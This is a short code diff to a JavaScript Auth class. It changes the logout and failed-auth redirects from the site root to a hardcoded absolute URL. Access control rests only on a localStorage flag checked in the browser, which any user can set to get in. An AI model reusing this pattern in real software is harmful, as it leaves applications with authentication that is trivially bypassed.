@@ -7,7 +7,7 @@ class Auth {
 
     validateAuth(auth) {
         if (auth != 1) {
-            window.location.replace("/");
+            window.location.replace("https://mydatabase.com.ng/res/index.html");
         } else {
             document.querySelector("body").style.display = "block";
         }
@@ -16,6 +16,7 @@ class Auth {
     logOut() {
         localStorage.removeItem("auth");
         localStorage.removeItem("user");
-        window.location.replace("/");
+        window.history.pushState("", "", "https://mydatabase.com.ng/res/index.html");
+        window.location.reload();
     }
 }
